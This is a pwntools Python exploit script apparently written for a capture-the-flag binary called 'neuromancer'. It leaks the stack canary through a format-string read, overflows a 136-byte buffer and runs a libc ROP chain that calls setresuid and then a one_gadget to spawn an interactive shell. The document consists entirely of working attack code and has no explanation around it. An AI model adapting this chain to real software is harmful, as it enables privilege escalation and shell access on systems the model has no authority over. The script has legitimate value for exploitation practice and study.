from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-v"]

if (args.GDB):
	p = gdb.debug("./neuromancer",
	'''
	b * 0x0000000000401582
	b * 0x0000000000401593
	r
	c
	''')
else:
	p = process("./neuromancer")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
setuid = libc.symbols["setresuid"]
libc_base1 = 0x7ffff7c00000
pop_rdi = 0x10f78b
pop_rsi = 0x2b46b
pop_rdx = 0xb505c
print(hex(libc_base1+setuid))
pop_rbx = 0xa1e1e
one_gadgetaddr = 0x583ec

payload = [
	p64(libc_base1+pop_rdi),
	p64(1026),
	p64(libc_base1+pop_rsi),
	p64(1026),
	p64(1234),
	p64(libc_base1+pop_rdx),
	p64(1026),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(libc_base1+setuid),
	p64(libc_base1+pop_rbx),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(0x01),
	p64(libc_base1+0x2882f), #stack 16-byte alignment
	p64(libc_base1+one_gadgetaddr)
]

chain = b"".join(payload)

p.sendline(b"%15$p")
p.recvuntil(b"Trace echo: ")

canary = p.recvline()
canary = int(canary.strip().decode(), 16)

payload = b"A" * 136
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += chain

print(hexdump(payload))

p.sendline(payload)
p.interactive()

